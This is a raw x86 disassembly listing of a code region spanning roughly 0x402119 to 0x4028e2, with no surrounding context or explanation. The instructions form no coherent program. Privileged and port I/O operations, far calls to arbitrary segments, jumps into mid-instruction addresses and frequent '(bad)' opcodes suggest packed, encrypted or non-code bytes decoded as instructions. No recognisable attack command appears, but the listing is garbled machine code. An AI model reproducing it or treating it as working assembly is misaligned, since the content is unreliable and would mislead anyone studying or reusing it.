  402119:	and    edx,DWORD PTR [ecx+eiz*4]
  40211c:	lea    esi,[esi]
  40211e:	xchg   esp,eax
  40211f:	dec    eax
  402120:	pop    edi
  402121:	lea    eax,[esi-0x22]
  402124:	and    DWORD PTR [ebp+0x5385a910],edx
  40212a:	xor    BYTE PTR [esi+0x6aa10524],dl
  402130:	daa    
  402131:	imul   BYTE PTR [esp+esi*2]
  402134:	popf   
  402135:	rcl    BYTE PTR [edx-0x32564cd4],1
  40213b:	inc    edi
  40213c:	in     eax,dx
  40213d:	xor    eax,0xf3383eff
  402142:	into   
  402143:	pusha  
  402144:	cmp    BYTE PTR [eax],cl
  402146:	sbb    DWORD PTR [eax],eax
  402148:	dec    ebx
  402149:	lahf   
  40214a:	sub    esi,DWORD PTR [ecx+0x208c3232]
  402150:	dec    BYTE PTR [ebx]
  402152:	jp     0x4020f8
  402154:	mov    esp,0x508c2882
  402159:	shr    esi,1
  40215b:	call   0xaab2:0x84b7466f
  402162:	cwde   
  402163:	or     al,0x95
  402165:	cs aam 0x20
  402168:	sti    
  402169:	push   eax
  40216a:	mov    ch,0x68
  40216c:	arpl   WORD PTR [esi-0xa5d310a],dx
  402172:	or     DWORD PTR [ecx-0x46],edx
  402175:	pop    es
  402176:	daa    
  402177:	loopne 0x40210f
  402179:	stc    
  40217a:	xchg   edx,eax
  40217b:	jb     0x402181
  40217d:	or     ecx,DWORD PTR [edi-0x642b9273]
  402183:	pop    ebx
  402184:	add    DWORD PTR ds:0xd823cfb9,ebp
  40218a:	bound  ecx,QWORD PTR [ecx-0x4b]
  40218d:	in     eax,dx
  40218e:	push   ss
  40218f:	lock lods al,BYTE PTR ds:[esi]
  402191:	mov    ebx,0x81513ad8
  402196:	jecxz  0x402211
  402198:	push   edx
  402199:	adc    bh,BYTE PTR [edi-0x66582794]
  40219f:	jmp    0xe59509d4
  4021a4:	mov    dh,0x89
  4021a6:	push   ebx
  4021a7:	xchg   ebx,eax
  4021a8:	das    
  4021a9:	jl     0x4021eb
  4021ab:	shr    DWORD PTR [edx+eiz*2],0x18
  4021af:	jb     0x402182
  4021b1:	xlat   BYTE PTR ds:[ebx]
  4021b2:	fmul   DWORD PTR [ebp-0x232daae8]
  4021b8:	push   cs
  4021b9:	adc    ebx,DWORD PTR [ebp-0x7]
  4021bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021bd:	lock fidivr DWORD PTR [esi]
  4021c0:	fcmovbe st,st(1)
  4021c2:	in     al,0x92
  4021c4:	fxch   st(3)
  4021c6:	scas   al,BYTE PTR es:[edi]
  4021c7:	jns    0x4021b1
  4021c9:	out    dx,eax
  4021ca:	(bad)  
  4021cc:	inc    esp
  4021cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021ce:	push   ebp
  4021cf:	inc    ecx
  4021d0:	cmp    ch,BYTE PTR [edx+0x3d624885]
  4021d6:	xor    al,0xe0
  4021d8:	fimul  DWORD PTR [ebp+0x57]
  4021db:	sub    DWORD PTR [eax],0x6b
  4021de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021df:	fdiv   st,st(6)
  4021e1:	adc    cl,BYTE PTR [ebx]
  4021e3:	or     dl,BYTE PTR es:[eax]
  4021e6:	scas   al,BYTE PTR es:[edi]
  4021e7:	aam    0x6c
  4021e9:	dec    esp
  4021ea:	adc    ah,bl
  4021ec:	xchg   edi,eax
  4021ed:	inc    eax
  4021ee:	fs loope 0x40219d
  4021f1:	or     ecx,esi
  4021f3:	je     0x4021b7
  4021f5:	neg    bh
  4021f7:	inc    esi
  4021f8:	sti    
  4021f9:	dec    edi
  4021fa:	sahf   
  4021fb:	dec    esp
  4021fc:	mov    eax,ds:0x85917b58
  402201:	ins    BYTE PTR es:[edi],dx
  402202:	mov    dh,0x68
  402204:	or     DWORD PTR [edx+0x4fc7beb4],eax
  40220a:	sbb    eax,0x19dc95a5
  40220f:	pop    eax
  402210:	sub    eax,0x9ccffba7
  402215:	gs test dh,dh
  402218:	mov    eax,DWORD PTR [ebx+edi*8-0x49]
  40221c:	adc    al,0x4b
  40221e:	mov    esp,DWORD PTR [eax+0x3b27244e]
  402224:	not    bh
  402226:	or     al,0xe0
  402228:	sbb    DWORD PTR ds:0x3f97d3f4,esi
  40222e:	arpl   WORD PTR [edi],di
  402230:	jno    0x4022b0
  402232:	mov    WORD PTR [esi+0xaa71315],cs
  402238:	adc    bh,ch
  40223a:	pop    ebx
  40223b:	jbe    0x4022b2
  40223d:	push   0xffffffec
  40223f:	xchg   DWORD PTR [eax+0x78b8ad5],edi
  402245:	repz push cs
  402247:	iret   
  402248:	(bad)  
  402249:	pusha  
  40224a:	ins    BYTE PTR es:[edi],dx
  40224b:	xchg   esp,eax
  40224c:	add    BYTE PTR [eax],ch
  40224e:	fimul  DWORD PTR ds:[ebx]
  402251:	(bad)  
  402252:	pop    esp
  402253:	nop
  402254:	inc    esi
  402255:	jne    0x40224a
  402257:	mov    al,0x49
  402259:	xor    ecx,DWORD PTR [edx]
  40225b:	movsx  esp,bp
  40225e:	add    ah,BYTE PTR [eax]
  402260:	inc    eax
  402261:	pop    ebx
  402262:	enter  0x8e0f,0x56
  402266:	mov    eax,ds:0xb2f8bb82
  40226b:	out    0xb0,eax
  40226d:	pop    esi
  40226e:	push   0xf5da4ac1
  402273:	int    0xcc
  402275:	xchg   esp,eax
  402276:	fimul  DWORD PTR [edi]
  402278:	inc    esp
  402279:	sub    DWORD PTR [eax+0x28],edx
  40227c:	add    BYTE PTR [ebp-0x7e],0xa4
  402280:	adc    al,0x1b
  402282:	hlt    
  402283:	dec    ebp
  402284:	aas    
  402285:	cld    
  402286:	or     bl,BYTE PTR ds:0x47158e30
  40228c:	mov    ds:0xfa5c0b79,al
  402291:	outs   dx,DWORD PTR ds:[esi]
  402292:	dec    esp
  402293:	xchg   BYTE PTR [ecx-0x14499f3],bl
  402299:	loope  0x4022b1
  40229b:	ret    0x5a68
  40229e:	sbb    eax,0xdf3ede01
  4022a3:	add    ah,BYTE PTR [edx-0x7bb113ce]
  4022a9:	shl    esi,0x7e
  4022ac:	xor    esi,edi
  4022ae:	mov    ds:0xea3aaee0,al
  4022b3:	cmovbe esp,ebp
  4022b6:	loope  0x4022ca
  4022b8:	mov    DWORD PTR cs:[ecx+0x32156dbd],esp
  4022bf:	loop   0x4022a7
  4022c1:	inc    DWORD PTR [ecx+0x10]
  4022c4:	cmp    eax,0x42d0e997
  4022c9:	scas   al,BYTE PTR es:[edi]
  4022ca:	pusha  
  4022cb:	data16 ja 0x40229c
  4022ce:	xor    DWORD PTR [edx+0x4c],0x78
  4022d2:	into   
  4022d3:	leave  
  4022d4:	stos   DWORD PTR es:[edi],eax
  4022d5:	sub    DWORD PTR [edx-0x65cbcbeb],esp
  4022db:	mov    cl,0xa1
  4022dd:	dec    ebx
  4022de:	xchg   ebx,eax
  4022df:	sub    WORD PTR [edx-0xa5825ec],sp
  4022e6:	cmp    BYTE PTR [esi-0x1b2690e9],0x5b
  4022ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022ee:	jb     0x402291
  4022f0:	sub    ch,BYTE PTR [eax-0x31]
  4022f3:	jge    0x402298
  4022f5:	pusha  
  4022f6:	lea    ebx,[ebx+esi*4+0x5ca23da9]
  4022fd:	or     BYTE PTR [edi-0x16],0x59
  402301:	jae    0x40229d
  402303:	in     al,dx
  402304:	push   cs
  402305:	sbb    BYTE PTR [eax-0x52b632fa],ah
  40230b:	sub    dh,bh
  40230d:	inc    ebx
  40230e:	sti    
  40230f:	and    al,0xcb
  402311:	mov    cl,0xe2
  402313:	in     eax,0xc9
  402315:	out    dx,al
  402316:	sub    al,0x51
  402318:	retf   0xc050
  40231b:	mov    dl,0xb1
  40231d:	adc    eax,0x8adfb2a8
  402322:	scas   eax,DWORD PTR es:[edi]
  402323:	pop    es
  402324:	or     bl,dh
  402326:	icebp  
  402327:	mov    esi,0xd2c3397e
  40232c:	inc    ebx
  40232d:	sbb    eax,0xdcd33e97
  402332:	addr16 sub al,0x6f
  402335:	imul   ebx,DWORD PTR [ebx],0x1cc7654
  40233b:	or     cl,bh
  40233d:	std    
  40233e:	(bad)  
  40233f:	or     al,0xf0
  402341:	jo     0x402322
  402343:	popf   
  402344:	test   al,0xe2
  402346:	pop    esi
  402347:	(bad)  
  402348:	data16 mov ch,0xbb
  40234b:	mov    bh,0x8f
  40234d:	mov    bh,0x71
  40234f:	(bad)  
  402350:	in     al,dx
  402351:	mov    dl,0xcb
  402353:	popf   
  402354:	and    BYTE PTR [edi],bh
  402356:	es jmp 0x6914dfda
  40235c:	dec    esi
  40235d:	cmp    al,0x3a
  40235f:	pop    es
  402360:	stos   DWORD PTR es:[edi],eax
  402361:	ins    DWORD PTR es:[edi],dx
  402362:	xchg   edi,eax
  402363:	inc    esi
  402364:	in     eax,dx
  402365:	cmp    al,0x2a
  402367:	mov    eax,ds:0x7f1655f2
  40236c:	inc    eax
  40236d:	and    edx,DWORD PTR [ecx]
  40236f:	inc    ebp
  402370:	push   0x5f
  402372:	xor    BYTE PTR [eax],bl
  402374:	inc    ecx
  402375:	(bad)  
  402376:	fidiv  DWORD PTR [edi]
  402378:	and    dl,0xb0
  40237b:	stos   BYTE PTR es:[edi],al
  40237c:	mov    BYTE PTR [ebx+ebp*1],0x5c
  402380:	addr16 aas 
  402382:	sub    cl,BYTE PTR [ebp-0x7a511337]
  402388:	mov    esi,0xe92f469a
  40238d:	jnp    0x4023e8
  40238f:	xchg   esi,eax
  402390:	pop    ss
  402391:	mov    edi,0x6df56c92
  402396:	dec    edx
  402397:	fld    DWORD PTR [ebp-0x64]
  40239a:	pop    es
  40239b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40239c:	fs js  0x402396
  40239f:	inc    ecx
  4023a0:	jmp    0x383b7d60
  4023a5:	xchg   esi,eax
  4023a6:	ret    
  4023a7:	out    dx,eax
  4023a8:	mov    ch,BYTE PTR [eax-0xd]
  4023ab:	xchg   DWORD PTR [edi+0x30],ecx
  4023ae:	dec    ecx
  4023af:	pop    ebp
  4023b0:	jecxz  0x40238d
  4023b2:	in     al,0x80
  4023b4:	mov    ecx,0x2a895611
  4023b9:	(bad)  
  4023ba:	sbb    al,0xea
  4023bc:	mov    ss,ebp
  4023be:	mov    ebp,0x807f25fb
  4023c3:	push   esi
  4023c4:	pop    edx
  4023c5:	jle    0x402444
  4023c7:	inc    ebx
  4023c8:	xchg   DWORD PTR [edi+esi*8-0x2d7eb56a],ebp
  4023cf:	add    esi,DWORD PTR [eax]
  4023d1:	outs   dx,BYTE PTR ds:[esi]
  4023d2:	inc    ebp
  4023d3:	fcmovnb st,st(7)
  4023d5:	add    ch,dl
  4023d7:	test   al,0xd4
  4023d9:	mov    ch,0x6c
  4023db:	xchg   ebx,eax
  4023dc:	loop   0x4023b6
  4023de:	fwait
  4023df:	(bad)  
  4023e0:	jg     0x402386
  4023e2:	int3   
  4023e3:	inc    ecx
  4023e4:	cdq    
  4023e5:	and    esp,esi
  4023e7:	test   al,0xf9
  4023e9:	xor    eax,DWORD PTR [ebp-0x605569ee]
  4023ef:	fbld   TBYTE PTR [ebx]
  4023f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023f2:	fnstsw WORD PTR [ebx+0x37]
  4023f5:	retf   
  4023f6:	popf   
  4023f7:	es xchg esi,eax
  4023f9:	repz rol BYTE PTR [edx+0x2a5277d1],0xa8
  402401:	sbb    BYTE PTR [ebp-0x9c3891f],cl
  402407:	jno    0x402431
  402409:	jb     0x40244c
  40240b:	repnz or DWORD PTR [ebx+0x5207e17e],ecx
  402412:	add    DWORD PTR [ebp+0x3d],ebp
  402415:	dec    ebp
  402416:	stos   DWORD PTR es:[edi],eax
  402417:	mov    bl,0x6d
  402419:	mov    edi,0x50da1550
  40241e:	sub    al,dl
  402420:	sbb    BYTE PTR [edi+eiz*1+0x443c80b3],bl
  402427:	data16 sbb BYTE PTR [edx],dl
  40242a:	mov    ebp,0x57861520
  40242f:	imul   ecx,DWORD PTR [edx],0x56
  402432:	test   DWORD PTR [edx+0x10],esp
  402435:	push   ebx
  402436:	push   edx
  402437:	sahf   
  402438:	clc    
  402439:	mov    edi,0xf35c968b
  40243e:	(bad)  
  402440:	pop    esi
  402441:	test   al,0x1d
  402443:	stos   DWORD PTR es:[edi],eax
  402444:	imul   esp,DWORD PTR [edx],0xfffffff0
  402447:	adc    BYTE PTR [edx+0x22],dh
  40244a:	sbb    BYTE PTR [esi-0xb],0xac
  40244e:	fcmovne st,st(4)
  402450:	fisttp WORD PTR [ebx-0x22]
  402453:	add    DWORD PTR [ebp-0x607d4361],ebx
  402459:	(bad)  
  40245a:	and    eax,0x6b5ce96a
  40245f:	fwait
  402460:	sbb    DWORD PTR [eax],ebx
  402462:	es (bad) 
  402464:	(bad)  
  402465:	pop    ecx
  402466:	les    edi,FWORD PTR ds:[ebx-0x54]
  40246a:	cli    
  40246b:	adc    eax,0x53cbddc1
  402470:	inc    edx
  402471:	bound  ebp,QWORD PTR [esi+0x19e0272a]
  402477:	sub    BYTE PTR [esi+0x55e287fd],0xc2
  40247e:	mov    esp,0xbdfbe6bd
  402483:	mov    cl,0xb7
  402485:	sar    DWORD PTR [ecx+eiz*1-0x3d],cl
  402489:	loope  0x4024c8
  40248b:	jp     0x4024e5
  40248d:	test   eax,0x6ad9cddf
  402492:	ins    BYTE PTR es:[edi],dx
  402493:	mov    al,BYTE PTR [esi-0x6a1746f]
  402499:	mov    dl,0xc7
  40249b:	sahf   
  40249c:	mov    ch,0x56
  40249e:	jg     0x4024af
  4024a0:	or     eax,0x1c6e9f40
  4024a5:	(bad)  
  4024a6:	jb     0x4024d5
  4024a8:	and    BYTE PTR [eax-0x5fb2da21],cl
  4024ae:	jbe    0x402458
  4024b0:	int    0x30
  4024b2:	addr16 sub ch,al
  4024b5:	(bad)  
  4024b6:	cmp    esi,DWORD PTR [edx-0x19fe1caa]
  4024bc:	pop    ebx
  4024bd:	jge    0x40253c
  4024bf:	xor    BYTE PTR [ebx+ebp*2+0x1238ac81],ah
  4024c6:	div    dh
  4024c8:	or     DWORD PTR [esi],edx
  4024ca:	push   edi
  4024cb:	mov    ecx,0x37b17e54
  4024d0:	xor    al,0xf1
  4024d2:	pop    ds
  4024d3:	ins    BYTE PTR es:[edi],dx
  4024d4:	call   0x6794:0x7bb36339
  4024db:	push   ebp
  4024dc:	inc    esi
  4024dd:	cli    
  4024de:	ror    DWORD PTR ds:0x7a497ebf,1
  4024e4:	(bad)  
  4024e5:	sbb    ebp,edx
  4024e7:	jbe    0x4024f5
  4024e9:	imul   edx,ebx,0x1d
  4024ec:	add    eax,0xe7870643
  4024f1:	dec    ecx
  4024f2:	push   ss
  4024f3:	mov    edi,0xe34da7b9
  4024f8:	push   0x8f4e6f56
  4024fd:	fisub  WORD PTR [edi-0x19]
  402500:	add    al,cl
  402502:	mov    edi,0x790eab1a
  402507:	adc    BYTE PTR [esi-0x18],dl
  40250a:	mov    ecx,0x3f79e819
  40250f:	or     al,0x6e
  402511:	dec    eax
  402512:	jne    0x40249b
  402514:	push   ecx
  402515:	pop    ds
  402516:	fisttp DWORD PTR [ebx+0x21]
  402519:	or     eax,0x5e7e2b0c
  40251e:	loop   0x402587
  402520:	out    0x2f,eax
  402522:	xor    eax,0x545233f1
  402527:	imul   eax,DWORD PTR [eax+0x6ea8012b],0x1f
  40252e:	ret    0xaf3b
  402531:	lods   al,BYTE PTR ds:[esi]
  402532:	lods   eax,DWORD PTR ds:[esi]
  402533:	and    dl,BYTE PTR [ebp+0x56cb3522]
  402539:	sti    
  40253a:	jg     0x402528
  40253c:	arpl   WORD PTR [ecx+0x3a],bp
  40253f:	rcl    BYTE PTR [edi-0x53],cl
  402542:	aad    0x6c
  402544:	cld    
  402545:	popa   
  402546:	pusha  
  402547:	xor    bl,BYTE PTR [ebp-0x1f]
  40254a:	xchg   esp,eax
  40254b:	loope  0x402593
  40254d:	add    ecx,DWORD PTR [edx-0x3c695c9]
  402553:	fwait
  402554:	mov    ds:0xaba19ed3,eax
  402559:	clc    
  40255a:	scas   eax,DWORD PTR es:[edi]
  40255b:	loop   0x402531
  40255d:	inc    edx
  40255e:	fs daa 
  402560:	adc    esi,eax
  402562:	xchg   edx,eax
  402563:	int    0x79
  402565:	cwde   
  402566:	loopne 0x40252f
  402568:	sub    al,BYTE PTR [ebp+0x35]
  40256b:	add    BYTE PTR [edx+0x508f7556],dh
  402571:	leave  
  402572:	push   edi
  402573:	dec    ebx
  402574:	dec    edi
  402575:	call   0x6182:0xfa4d5fdd
  40257c:	and    al,BYTE PTR [ebp-0xdb20413]
  402582:	dec    edx
  402583:	xor    al,0xc8
  402585:	jle    0x4025ae
  402587:	arpl   WORD PTR [ecx-0x8f06ed6],dx
  40258d:	mov    BYTE PTR [ebx+0x69],dl
  402590:	out    dx,al
  402591:	mov    ebp,0x391cba10
  402596:	mov    BYTE PTR [ecx+edi*8-0x76],0x7b
  40259b:	sub    DWORD PTR [ecx],0xffffff9c
  40259e:	inc    ebp
  40259f:	popa   
  4025a0:	adc    al,BYTE PTR [edx-0x4940515d]
  4025a6:	pusha  
  4025a7:	xchg   edi,eax
  4025a8:	shl    BYTE PTR [ebx-0x12],1
  4025ab:	dec    esp
  4025ac:	aaa    
  4025ad:	push   ebx
  4025ae:	sub    bh,BYTE PTR [ecx-0xc]
  4025b1:	dec    edi
  4025b2:	and    edi,0x732753c9
  4025b8:	sti    
  4025b9:	ins    BYTE PTR es:[edi],dx
  4025ba:	sub    al,0xf7
  4025bc:	loop   0x402634
  4025be:	sbb    al,0x34
  4025c0:	aaa    
  4025c1:	sub    ebp,DWORD PTR [ecx+0x367390e7]
  4025c7:	mov    edi,DWORD PTR [ebx]
  4025c9:	fdivr  st(7),st
  4025cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025cc:	and    BYTE PTR [eax],ah
  4025ce:	cmp    eax,0xa025d2e9
  4025d4:	xchg   ecx,eax
  4025d5:	hlt    
  4025d6:	cmp    dh,BYTE PTR [edi+eax*2+0x4f52b0bd]
  4025dd:	dec    ebx
  4025de:	ja     0x402571
  4025e0:	dec    esi
  4025e1:	sbb    ecx,edi
  4025e3:	fwait
  4025e4:	loopne 0x40256c
  4025e6:	or     al,0x15
  4025e8:	dec    ecx
  4025e9:	aas    
  4025ea:	fndisi(8087 only) 
  4025ec:	inc    eax
  4025ed:	aad    0xa3
  4025ef:	dec    ebx
  4025f0:	test   BYTE PTR [ecx+0x1e],bh
  4025f3:	scas   al,BYTE PTR es:[edi]
  4025f4:	retf   
  4025f5:	adc    dh,bh
  4025f7:	arpl   WORD PTR [eax-0x754e2d86],sp
  4025fd:	push   es
  4025fe:	popf   
  4025ff:	ja     0x4025cb
  402601:	sub    eax,0x3a9b0c8
  402606:	scas   eax,DWORD PTR es:[edi]
  402607:	hlt    
  402608:	stos   BYTE PTR es:[edi],al
  402609:	jb     0x40261c
  40260b:	sti    
  40260c:	hlt    
  40260d:	faddp  st(7),st
  40260f:	retf   
  402610:	dec    edi
  402611:	(bad)  
  402612:	fidivr DWORD PTR [edi]
  402614:	jbe    0x40263c
  402616:	dec    edi
  402617:	pop    edi
  402618:	repz xchg ecx,eax
  40261a:	js     0x40262b
  40261c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40261d:	and    bh,BYTE PTR [edi+eiz*2+0x0]
  402621:	or     edx,esp
  402623:	sbb    dl,BYTE PTR [esi-0x7341a6f]
  402629:	and    DWORD PTR [esi-0x71],ebx
  40262c:	xchg   esp,eax
  40262d:	cmc    
  40262e:	inc    eax
  40262f:	(bad)  fs:[ebx+0x51d2609b]
  402636:	adc    ah,BYTE PTR [edx-0x724a6f9a]
  40263c:	push   edi
  40263d:	mov    dl,0x4d
  40263f:	fcomip st,st(7)
  402641:	or     ebx,0xa10c6d7d
  402647:	loope  0x40268b
  402649:	mov    dl,0x5f
  40264b:	mov    bh,BYTE PTR [edx+0x25]
  40264e:	nop
  40264f:	lock jae 0x40268a
  402652:	cmp    eax,0xd0df32b7
  402657:	ss or  eax,0x9f82a92e
  40265d:	push   ebx
  40265e:	out    dx,eax
  40265f:	dec    edi
  402660:	call   FWORD PTR [edi]
  402662:	and    BYTE PTR fs:[ecx-0x23],al
  402666:	pop    ebp
  402667:	int    0xfd
  402669:	loope  0x40266e
  40266b:	cmp    al,0x32
  40266d:	mov    bh,0x1d
  40266f:	mov    cl,0xa9
  402671:	call   0xf712f33e
  402676:	(bad)  
  402677:	repnz ds adc cl,dh
  40267b:	mov    ah,0xab
  40267d:	data16 (bad) 
  40267f:	mov    ebx,0x75bf32c2
  402684:	enter  0x8caa,0x9a
  402688:	jge    0x40266a
  40268a:	test   dh,ah
  40268c:	dec    ebx
  40268d:	adc    BYTE PTR [edx-0x72b68725],dh
  402693:	call   0x247896b2
  402698:	and    eax,0x4e8c8e3e
  40269d:	cld    
  40269e:	loop   0x4026f5
  4026a0:	mov    ah,0x4f
  4026a2:	in     al,dx
  4026a3:	in     eax,0x68
  4026a5:	sbb    dh,BYTE PTR [ecx-0x73f7bdd8]
  4026ab:	xchg   ecx,eax
  4026ac:	pop    ebx
  4026ad:	mov    ds:0xf486da5d,al
  4026b2:	fadd   DWORD PTR [ebp-0x58]
  4026b5:	pushf  
  4026b6:	push   esp
  4026b7:	dec    ebx
  4026b8:	call   0xf6923d63
  4026bd:	pop    esp
  4026be:	(bad)  
  4026bf:	pop    esp
  4026c0:	shl    DWORD PTR [ebp+0x4b],0x5a
  4026c4:	inc    ebp
  4026c5:	data16 repz and BYTE PTR [ecx-0x31f4953],dh
  4026cd:	or     BYTE PTR ds:0x554a7358,dl
  4026d3:	mov    BYTE PTR [ecx-0x5e],0x92
  4026d7:	out    dx,al
  4026d8:	and    DWORD PTR [edi],ebx
  4026da:	out    dx,al
  4026db:	cs pop edi
  4026dd:	mov    dh,0xaf
  4026df:	and    al,0x6b
  4026e1:	sbb    edi,ecx
  4026e3:	cli    
  4026e4:	arpl   bx,bp
  4026e6:	mov    ds:0x65d794d7,eax
  4026eb:	mov    eax,ds:0x603d292b
  4026f0:	pop    eax
  4026f1:	enter  0x3cf7,0xb5
  4026f5:	cld    
  4026f6:	xchg   bl,al
  4026f8:	stc    
  4026f9:	adc    eax,0xf6ae465e
  4026fe:	pop    eax
  4026ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402700:	xchg   esp,eax
  402701:	pop    esi
  402702:	imul   DWORD PTR [ebp+ebx*2-0x2d]
  402706:	out    dx,eax
  402707:	mov    DWORD PTR [edx-0x74],esp
  40270a:	inc    eax
  40270b:	add    cl,0x1a
  40270e:	dec    eax
  40270f:	inc    ebp
  402710:	jmp    0x4026e4
  402712:	outs   dx,BYTE PTR ds:[esi]
  402713:	inc    eax
  402714:	stos   BYTE PTR es:[edi],al
  402715:	mov    eax,ds:0x929f140c
  40271a:	pop    esi
  40271b:	out    0x98,eax
  40271d:	int    0xe6
  40271f:	dec    ecx
  402720:	push   es
  402721:	popf   
  402722:	cmp    BYTE PTR [ecx],0x95
  402725:	popf   
  402726:	mov    ch,0xeb
  402728:	jecxz  0x402724
  40272a:	pop    ss
  40272b:	cwde   
  40272c:	inc    ecx
  40272d:	or     eax,0x6593a830
  402732:	outs   dx,BYTE PTR ds:[esi]
  402733:	in     eax,dx
  402734:	ret    0xcdb0
  402737:	sbb    eax,0x7402174d
  40273c:	and    BYTE PTR [eax-0x3d],bh
  40273f:	shl    BYTE PTR [ebp+ebx*2+0x2efc7ef9],cl
  402746:	es mov ch,0x97
  402749:	retf   
  40274a:	xchg   edx,eax
  40274b:	(bad)  
  40274c:	in     eax,0x15
  40274e:	js     0x4027a4
  402750:	sbb    al,BYTE PTR [eax+0x7c]
  402753:	les    edi,FWORD PTR [eax-0x3509a0b0]
  402759:	ret    0xe917
  40275c:	loop   0x4027cb
  40275e:	push   esi
  40275f:	xor    dh,BYTE PTR [esi]
  402761:	and    DWORD PTR [ebx],ebp
  402763:	mov    DWORD PTR [ebp-0x11],ebp
  402766:	sbb    BYTE PTR [edi+0x3ae3171],dh
  40276c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40276d:	scas   eax,DWORD PTR es:[edi]
  40276e:	jo     0x4027d2
  402770:	mov    ebp,0x1c347183
  402775:	mov    dl,cl
  402777:	xor    DWORD PTR ds:0xa8552838,edx
  40277d:	clts   
  40277f:	ret    
  402780:	push   esi
  402781:	push   cs
  402782:	sub    al,0xd2
  402784:	jae    0x40274a
  402786:	xchg   BYTE PTR [edi-0x28bdac61],bl
  40278c:	dec    esp
  40278d:	cmp    esi,DWORD PTR [edx+0x36]
  402790:	cmp    eax,0x4c3b8bf3
  402795:	xchg   ebp,eax
  402796:	jg     0x402784
  402798:	enter  0x6aaa,0x34
  40279c:	add    ebp,edx
  40279e:	lods   al,BYTE PTR ds:[esi]
  40279f:	stc    
  4027a0:	mov    BYTE PTR [eax+0x2f],dl
  4027a3:	arpl   WORD PTR ds:0x73dde110,si
  4027a9:	out    dx,al
  4027aa:	imul   esp,DWORD PTR [edx+0x70627590],0xffffffd9
  4027b1:	adc    bh,BYTE PTR [ebp+esi*8+0x4a6519f1]
  4027b8:	push   esi
  4027b9:	push   es
  4027ba:	outs   dx,DWORD PTR ds:[esi]
  4027bb:	push   ecx
  4027bc:	xlat   BYTE PTR ds:[ebx]
  4027bd:	stc    
  4027be:	xlat   BYTE PTR ds:[ebx]
  4027bf:	int3   
  4027c0:	adc    DWORD PTR [esi-0x50c980ee],0x34
  4027c7:	or     eax,0xd51c9e72
  4027cc:	mov    esi,0xb430b4a0
  4027d1:	in     eax,0x30
  4027d3:	mov    ecx,0xaff79d40
  4027d8:	push   ds
  4027d9:	shl    DWORD PTR [edx-0x2ec40b06],cl
  4027df:	cwde   
  4027e0:	nop
  4027e1:	mov    ebp,0xf9cf630
  4027e6:	push   eax
  4027e7:	xchg   edx,eax
  4027e9:	pop    eax
  4027ea:	fsubr  DWORD PTR [edx+0x3325929c]
  4027f0:	scas   al,BYTE PTR es:[edi]
  4027f1:	repnz cmc 
  4027f3:	mov    dl,bh
  4027f5:	push   es
  4027f6:	add    BYTE PTR [ecx],dh
  4027f8:	imul   eax,DWORD PTR [esi],0x778e0c0f
  4027fe:	mul    BYTE PTR [ebx-0x7b]
  402801:	adc    eax,0x34edfd8e
  402806:	sub    ebx,DWORD PTR [edx+eiz*4]
  402809:	mov    dh,0x3
  40280b:	daa    
  40280c:	(bad)  
  40280d:	cmc    
  40280e:	adc    edx,edx
  402810:	dec    edi
  402811:	les    esi,FWORD PTR [esi+ecx*4-0x33]
  402815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402816:	scas   eax,DWORD PTR es:[edi]
  402817:	xchg   esi,eax
  402818:	pop    edx
  402819:	cmp    eax,edi
  40281b:	jae    0x402835
  40281d:	les    edi,FWORD PTR [edi+0x16]
  402820:	jnp    0x40284a
  402822:	nop
  402823:	dec    ebp
  402824:	rcr    BYTE PTR [edi+0x53b02ed4],0x60
  40282b:	data16 test BYTE PTR [esi+0x2f9467a9],ah
  402832:	fdiv   st(2),st
  402834:	add    bh,BYTE PTR [edx+0x5c2c5246]
  40283a:	sbb    BYTE PTR [edx],0x5
  40283d:	ds mov al,0x48
  402840:	lahf   
  402841:	rol    BYTE PTR [eax],cl
  402843:	xchg   ebp,eax
  402844:	mov    bl,0x2a
  402846:	fwait
  402847:	cmp    al,0x2b
  402849:	sub    DWORD PTR [ecx-0x721ee605],0x9629b4eb
  402853:	(bad)  
  402854:	loopne 0x40285a
  402856:	and    dh,BYTE PTR [ebp+0xe]
  402859:	jmp    0x769e6fd5
  40285e:	xchg   esi,eax
  40285f:	scas   al,BYTE PTR es:[edi]
  402860:	mov    bh,0x72
  402862:	adc    al,0xc9
  402864:	(bad)  
  402865:	popf   
  402866:	mov    ds:0xb65a3177,eax
  40286b:	mov    edx,DWORD PTR [edx+esi*1+0x61]
  40286f:	and    al,0x6c
  402871:	push   edx
  402872:	push   ecx
  402873:	mov    esp,0x3b909111
  402878:	popa   
  402879:	das    
  40287a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40287b:	add    ecx,DWORD PTR [ecx]
  40287d:	dec    esi
  40287e:	add    DWORD PTR [esi],esi
  402880:	pop    edi
  402881:	add    eax,0x708a40b7
  402886:	and    al,0x41
  402888:	adc    eax,0xde060b5
  40288d:	mov    edx,DWORD PTR [edi-0x2705a3dc]
  402893:	pop    esi
  402894:	sbb    DWORD PTR [edx-0x63581786],eax
  40289a:	loop   0x402852
  40289c:	loope  0x40289a
  40289e:	sbb    edx,0xb232a015
  4028a4:	mov    bh,0xe6
  4028a6:	enter  0x2348,0x48
  4028aa:	or     eax,0xea370252
  4028af:	imul   edi,edi,0x4d
  4028b2:	retf   
  4028b3:	mov    BYTE PTR [esp+edx*4-0x6],0x36
  4028b8:	stc    
  4028b9:	mov    bh,0xc
  4028bb:	data16 shl BYTE PTR ds:0xb97da1a5,1
  4028c2:	repnz fs pop ss
  4028c5:	push   edx
  4028c6:	sbb    ebx,DWORD PTR [ebp+ecx*8+0x46]
  4028ca:	sbb    ebx,DWORD PTR [ebx]
  4028cc:	xor    dh,bl
  4028ce:	adc    al,0x39
  4028d0:	sti    
  4028d1:	sbb    eax,0xe1b9ed3b
  4028d6:	repz pop esp
  4028d8:	and    al,0xe5
  4028da:	push   ss
  4028db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028dc:	add    DWORD PTR [ebx+0x31a50c51],ecx
  4028e2:	sub    bl,bh
